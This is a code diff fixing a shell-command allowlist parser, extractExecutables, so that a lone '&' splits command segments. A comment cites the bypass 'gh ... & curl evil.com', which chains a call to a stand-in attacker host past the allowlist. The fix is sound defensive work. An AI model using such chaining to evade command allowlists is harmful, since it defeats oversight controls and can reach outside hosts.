@@ -69,8 +69,11 @@ export function extractExecutables(command: string): { ok: true; executables: st
       hasWord = true;
       continue;
     }
-    if (c === ";" || c === "|" || c === "\n" || (c === "&" && command[i + 1] === "&")) {
-      if (c === "&") i++;
+    // Segment separators: ; | newline, and & — both background (`a & b`) and
+    // and-lists (`a && b`). A lone & must split like the others, or the command
+    // after it (`gh ... & curl evil.com`) runs unchecked past the allowlist.
+    if (c === ";" || c === "|" || c === "\n" || c === "&") {
+      if (c === "&" && command[i + 1] === "&") i++; // consume the second &
       endWord();
       sawCommand = false;
       continue;
